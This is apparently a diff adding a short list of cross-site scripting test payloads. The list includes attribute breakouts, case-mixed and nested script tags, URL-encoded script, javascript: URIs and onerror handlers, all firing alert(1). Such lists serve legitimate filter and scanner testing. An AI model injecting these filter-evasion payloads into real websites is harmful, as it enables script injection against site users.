@@ -1,0 +1,11 @@
+" onfocus="alert(1)
+"><script >alert(1)</script >
+"><ScRiPt>alert(1)</ScRiPt>
+"%3cscript%3ealert(1)%3c/script%3e
+<scr<script>ipt>alert(1)</script>
+<bgsound src="javascript:alert(1)">
+<img src="javascript:alert(1)">
+<<SCRIPT>alert(1);//<</SCRIPT>
+&lt;BODY ONLOAD=alert(1)&gt;
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
